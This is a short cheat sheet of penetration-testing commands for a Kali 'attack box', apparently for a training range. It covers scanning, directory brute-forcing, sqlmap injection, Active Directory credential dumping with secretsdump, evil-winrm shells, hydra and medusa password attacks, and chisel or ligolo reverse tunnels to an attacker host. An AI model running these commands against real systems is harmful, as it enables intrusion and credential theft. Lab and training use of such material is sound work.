# CYROID Kali Attack Box - Quick Reference

## Reconnaissance
```bash
nmap -sC -sV -p- -oA full_scan <target>
enum4linux-ng -A <target>
```

## Web Enumeration
```bash
# Directory bruteforce with gobuster
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/big.txt

# SQL injection
sqlmap -u "http://<target>/page?id=1" --batch --dbs
```

## Active Directory
```bash
kerbrute userenum -d <domain> --dc <dc_ip> users.txt
impacket-secretsdump <domain>/<user>:<pass>@<target>
evil-winrm -i <target> -u <user> -p <pass>
netexec smb <target> -u <user> -p <pass>
```

## Password Attacks (Online)
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> smb
medusa -h <target> -U users.txt -P passwords.txt -M smb
```

## Tunneling
```bash
# Chisel: chisel server -p 8080 --reverse | chisel client <attacker>:8080 R:socks
# Ligolo: ligolo-proxy -selfcert | ligolo-agent -connect <attacker>:11601 -ignore-cert
```

## File Locations
- Wordlists: /usr/share/wordlists/ (rockyou, dirb)
- PEAS scripts: /opt/tools/peas/
